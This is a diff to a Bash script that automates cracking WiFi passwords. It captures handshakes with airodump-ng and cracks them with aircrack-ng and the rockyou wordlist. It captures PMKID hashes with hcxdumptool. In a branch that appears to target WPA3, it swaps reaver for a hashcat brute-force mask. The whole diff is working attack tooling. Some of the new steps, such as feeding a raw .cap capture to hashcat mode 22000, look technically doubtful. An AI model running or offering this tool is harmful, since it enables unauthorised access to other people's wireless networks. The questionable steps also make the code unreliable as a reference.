@@ -70,6 +70,8 @@ function dependencies() {
         fi
         sleep 1
     done
+
+    asciiArt
 }
 
 function startMonitorMode() {
@@ -137,12 +139,14 @@ function startAttack() {
         wait $airodump_filter_xterm_PID 2>/dev/null
 
         xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
+
     elif [ "$attack_mode" == "PKMID" ]; then
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID.${endColour}"
-        timeout 180 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura & while :; do sleep 1; echo -n '.'; done"
-        echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
-        hcxpcapngtool -o myHashes Captura
-        rm Captura 2>/dev/null
+        timeout 60s hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng
+        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}"
+        if [ -f Captura.pcapng ]; then
+            hcxpcapngtool -z myHashes Captura.pcapng
+        fi
 
         if [ -f myHashes ]; then
             echo -e "\n${yellowColour}[*]${endColour}${grayColour} Hashes obtenidos en el archivo ${endColour}${blueColour}myHashes${endColour}"
@@ -168,7 +172,18 @@ function startAttack() {
         kill -9 $airodump_filter_xterm_PID 2>/dev/null
         wait $airodump_filter_xterm_PID 2>/dev/null
 
-        reaver -i ${networkCard}mon -b $bssid -c $apChannel -vv -K 1 -S
+        echo -e "${yellowColour}[*]${endColour}${grayColour} Obteniendo handshake...${endColour}"
+        xterm -hold -e "airodump-ng -c $apChannel --bssid $bssid -w Captura ${networkCard}mon" &
+        airodump_filter_xterm_PID=$!
+        sleep 60
+        kill -9 $airodump_filter_xterm_PID 2>/dev/null
+        wait $airodump_filter_xterm_PID 2>/dev/null
+
+        if [ -f Captura-01.cap ]; then
+            xterm -hold -e "hashcat -m 22000 Captura-01.cap -a 3 -1 ?l?d?s ?1?1?1?1?1?1?1?1" &
+        else
+            echo -e "\n${redColour}[!] No se ha capturado el handshake.${endColour}"
+        fi
     fi
 
     if [ "$attack_mode" == "Handshake" ] || [ "$attack_mode" == "PKMID" ] || [ "$attack_mode" == "WPA3" ]; then
@@ -178,8 +193,6 @@ function startAttack() {
 
 # Main
 if [ "$(id -u)" == "0" ]; then
-    asciiArt
-    dependencies
     while getopts "a:n:h" arg; do
         case $arg in
             a) attack_mode=$OPTARG ;;
@@ -189,6 +202,7 @@ if [ "$(id -u)" == "0" ]; then
     done
 
     if [ "$attack_mode" ] && [ "$networkCard" ]; then
+        dependencies
         startAttack
     else
         helpPanel
